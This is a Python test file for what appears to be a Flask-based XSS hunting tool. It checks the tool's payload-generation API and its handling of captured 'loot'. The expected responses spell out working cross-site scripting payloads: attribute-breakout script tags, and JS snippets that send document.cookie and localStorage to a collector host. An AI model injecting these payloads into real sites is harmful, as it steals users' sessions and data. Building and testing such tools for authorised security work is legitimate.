import json

from app import db
from app.api.models import XssGenerateModel
from app.api.xss import (
    _generate_collector_payload_body,
    _generate_js_grabber_payload_elements,
)
from app.models import XSS
from flask.testing import FlaskClient
from freezegun import freeze_time
from tests.helpers import create_client, create_xss, login


def test__xss_generate__given_html_collector__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={
            "client_id": 1,
            "url": "http://127.0.0.1",
            "xss_type": "s",
            "code_type": "html",
            "to_gather": ["dom"],
            "tags": ["tag1"],
            "custom_js": "dmFyIGEgPSA1CnZhciBiID02CmErYg==",
        },
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {
        "payload": '\'>"><script src=http://127.0.0.1/static/collector.min.js data="cyxhYmNkZWYsY29va2llcztmaW5nZXJwcmludDtsb2NhbF9zdG9yYWdlO29yaWdpbl91cmw7cmVmZXJyZXI7c2NyZWVuc2hvdDtzZXNzaW9uX3N0b3JhZ2UsdGFnMSxkbUZ5SUdFZ1BTQTFDblpoY2lCaUlEMDJDbUVyWWc9PQ=="></script>'
    }
    assert response.status_code == 200


def test__xss_generate__given_html_js_grabber__when_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": ["cookies"], "tags": ["tag1"], "custom_js": ""},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {
        "payload": '\'>"><script>new Image().src="http://127.0.0.1/api/x/s/abcdef?tags=tag1&cookies="+encodeURIComponent(document.cookie)</script>'
    }


def test__xss_generate__given_html_js_grabber__when_no_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": ["cookies"], "tags": [], "custom_js": ""},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": '\'>"><script>new Image().src="http://127.0.0.1/api/x/s/abcdef?cookies="+encodeURIComponent(document.cookie)</script>'}


def test__xss_generate__given_html_no_js__when_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": [], "tags": ["tag1"], "custom_js": ""},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": '\'>"><img src="http://127.0.0.1/api/x/s/abcdef?tags=tag1" />'}


def test__xss_generate__given_html_no_js__when_no_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": [], "tags": [], "custom_js": ""},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": '\'>"><img src="http://127.0.0.1/api/x/s/abcdef" />'}


def test__xss_generate__given_js_collector__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={
            "client_id": 1,
            "url": "http://127.0.0.1",
            "xss_type": "s",
            "code_type": "js",
            "to_gather": ["dom"],
            "tags": ["tag1"],
            "custom_js": "dmFyIGEgPSA1CnZhciBiID02CmErYg==",
        },
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {
        "payload": ';};var js=document.createElement("script");js.src="http://127.0.0.1/static/collector.min.js";js.setAttribute("data", "cyxhYmNkZWYsY29va2llcztmaW5nZXJwcmludDtsb2NhbF9zdG9yYWdlO29yaWdpbl91cmw7cmVmZXJyZXI7c2NyZWVuc2hvdDtzZXNzaW9uX3N0b3JhZ2UsdGFnMSxkbUZ5SUdFZ1BTQTFDblpoY2lCaUlEMDJDbUVyWWc9PQ==");document.body.appendChild(js);'
    }


def test__xss_generate__given_js_js_grabber__when_js_capture_and_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": ["cookies"], "tags": ["tag1"], "custom_js": ""},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": ';};new Image().src="http://127.0.0.1/api/x/s/abcdef?tags=tag1&cookies="+encodeURIComponent(document.cookie);'}


def test__xss_generate__given_js_js_grabber__when_js_capture_and_no_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": ["cookies"], "tags": [], "custom_js": ""},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": ';};new Image().src="http://127.0.0.1/api/x/s/abcdef?cookies="+encodeURIComponent(document.cookie);'}


def test__xss_generate__given_js_js_grabber__when_tags_and_no_js_capture__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": [], "tags": ["tag1"], "custom_js": ""},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": ';};new Image().src="http://127.0.0.1/api/x/s/abcdef?tags=tag1";'}


def test__xss_generate__given_js_js_grabber__when_no_js_capture_and_no_tags__then_payload_returned(client_tester: FlaskClient):
    create_client("test", uid="abcdef")
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": [], "tags": [], "custom_js": ""},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.json == {"payload": ';};new Image().src="http://127.0.0.1/api/x/s/abcdef?";'}


def test__xss_generate__given_request__when_bad_to_gather__then_400_returned(client_tester: FlaskClient):
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.post(
        "/api/xss/generate",
        json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": ["bad"], "tags": [], "custom_js": ""},
        headers={"Authorization": f"Bearer {access_token}"},
    )
    assert response.status_code == 400


def test___generate_collector_payload_body__given_body_and_client__then_payload_body_returned(client_tester: FlaskClient):
    client = create_client("test", uid="abcdef")
    body = XssGenerateModel(
        client_id=1,
        url="http://127.0.0.1",
        xss_type="r",
        code_type="html",
        to_gather=["local_storage"],
        tags=["tag1"],
        custom_js="dmFyIGEgPSA1CnZhciBiID02CmErYg==",
    )
    payload_body = _generate_collector_payload_body(body, client)
    assert (
        payload_body
        == "cixhYmNkZWYsY29va2llcztkb207ZmluZ2VycHJpbnQ7b3JpZ2luX3VybDtyZWZlcnJlcjtzY3JlZW5zaG90O3Nlc3Npb25fc3RvcmFnZSx0YWcxLGRtRnlJR0VnUFNBMUNuWmhjaUJpSUQwMkNtRXJZZz09"
    )


def test___generate_js_grabber_payload_elements__given_body__when_tags__then_tags_and_payload_returned(client_tester: FlaskClient):
    body = XssGenerateModel(client_id=1, url="http://127.0.0.1", xss_type="r", code_type="html", to_gather=["local_storage"], tags=["tag1"], custom_js="")
    tags_query_param, joined_and_trimmed_selected_payloads = _generate_js_grabber_payload_elements(body)
    assert tags_query_param == "tags=tag1"
    assert joined_and_trimmed_selected_payloads == 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))'


def test___generate_js_grabber_payload_elements__given_body__when_no_tags__then_tags_and_payload_returned(client_tester: FlaskClient):
    body = XssGenerateModel(client_id=1, url="http://127.0.0.1", xss_type="r", code_type="html", to_gather=["local_storage"], tags=[], custom_js="")
    tags_query_param, joined_and_trimmed_selected_payloads = _generate_js_grabber_payload_elements(body)
    assert tags_query_param == ""
    assert joined_and_trimmed_selected_payloads == 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))'


@freeze_time("2000-01-01")
def test__client_xss_get__given_request__then_xss_returned(client_tester: FlaskClient):
    xss: XSS = create_xss()
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.get(f"/api/xss/{xss.id}", headers={"Authorization": f"Bearer {access_token}"})
    assert response.json == {"data": {}, "headers": {}, "id": 1, "ip_addr": "127.0.0.1", "tags": [], "timestamp": 946684800}
    assert response.status_code == 200


def test__xss_delete__given_xss_id__then_xss_deleted(client_tester: FlaskClient):
    create_client(name="test")
    xss: XSS = create_xss()
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.delete(f"/api/xss/{xss.id}", headers={"Authorization": f"Bearer {access_token}"})
    assert db.session.query(XSS).count() == 0
    assert response.json == {"msg": "XSS deleted successfuly"}
    assert response.status_code == 200


def test__xss_loot_get__given_xss_id_and_loot_type__then_loot_returned(client_tester: FlaskClient):
    xss: XSS = create_xss(data={"cookies": {"Cookie1": "Value1"}})
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.get(f"/api/xss/{xss.id}/data/cookies", headers={"Authorization": f"Bearer {access_token}"})
    assert response.json == {"data": {"Cookie1": "Value1"}}
    assert response.status_code == 200


def test__xss_loot_delete__given_xss_id_and_loot_type__then_loot_deleted(client_tester: FlaskClient):
    create_client(name="test")
    xss: XSS = create_xss(data={"cookies": {"Cookie1": "Value1"}})
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.delete(f"/api/xss/{xss.id}/data/cookies", headers={"Authorization": f"Bearer {access_token}"})
    assert xss.data == json.dumps({})
    assert response.json == {"msg": "Data deleted successfuly"}
    assert response.status_code == 200


@freeze_time("2000-01-01")
def test__client_xss_get_all__given_no_filter__then_all_xss_returned(client_tester: FlaskClient):
    create_client("test")
    create_xss(xss_type="stored")
    create_xss(xss_type="reflected", client_id=2)
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.get(f"/api/xss", headers={"Authorization": f"Bearer {access_token}"})
    assert response.json == [
        {"id": 1, "ip_addr": "127.0.0.1", "tags": [], "timestamp": 946684800},
        {"id": 2, "ip_addr": "127.0.0.1", "tags": [], "timestamp": 946684800},
    ]
    assert response.status_code == 200


@freeze_time("2000-01-01")
def test__client_xss_get_all__given_type_and_client_id_filters__then_only_one_xss_returned(client_tester: FlaskClient):
    create_client("test")
    create_xss(xss_type="stored", tags=["test"])
    create_xss(xss_type="reflected")
    create_xss(xss_type="reflected", client_id=2)
    create_xss(xss_type="stored", client_id=2)
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.get(f"/api/xss?client_id=1&type=stored", headers={"Authorization": f"Bearer {access_token}"})
    assert response.json == [{"id": 1, "ip_addr": "127.0.0.1", "tags": ["test"], "timestamp": 946684800}]
    assert response.status_code == 200


def test__client_loot_get__given_no_filter__then_all_loot_returned(client_tester: FlaskClient):
    create_client("test")
    create_xss(xss_type="stored", data={"cookies": {"Cookie1": "Value1"}})
    create_xss(xss_type="reflected", client_id=2, data={"local_storage": {"Key1": "Value1"}})
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.get("/api/xss/data", headers={"Authorization": f"Bearer {access_token}"})
    assert response.json == [
        {"data": {"cookies": {"Cookie1": "Value1"}}, "tags": [], "xss_id": 1},
        {"data": {"local_storage": {"Key1": "Value1"}}, "tags": [], "xss_id": 2},
    ]
    assert response.status_code == 200


def test__client_loot_get__given_client_id_filter__then_only_one_loot_returned(client_tester: FlaskClient):
    create_client("test")
    create_xss(xss_type="stored", data={"cookies": {"Cookie1": "Value1"}})
    create_xss(xss_type="reflected", client_id=2, data={"local_storage": {"Key1": "Value1"}})
    access_token, refresh_token = login(client_tester, "admin", "xss")
    response = client_tester.get("/api/xss/data?client_id=1", headers={"Authorization": f"Bearer {access_token}"})
    assert response.json == [
        {"data": {"cookies": {"Cookie1": "Value1"}}, "tags": [], "xss_id": 1},
    ]
    assert response.status_code == 200
